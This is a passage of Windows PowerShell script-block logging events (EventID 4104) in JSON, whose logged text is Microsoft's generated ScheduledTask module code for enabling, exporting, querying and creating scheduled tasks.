  [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('EnableByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('EnableByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Enable-ScheduledTask' -Alias '",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.412922Z"
    },
    "EventRecordID": 78,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 2,
    "MessageTotal": 12,
    "ScriptBlockText": "*'\r\n        \r\n\r\nfunction Export-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([System.String])][OutputType([System.String])]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'System.String'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('ExportByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'System.String'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('ExportByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Export-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Get-ScheduledTaskInfo\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('GetInfoByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('GetInfoByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-ScheduledTaskInfo' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='New0', Position=0)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Principal},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=1)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='New0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='New0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='New0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:C",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.412944Z"
    },
    "EventRecordID": 79,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 3,
    "MessageTotal": 12,
    "ScriptBlockText": "lassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Principal')) {\r\n          [object]$__cmdletization_value = ${Principal}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        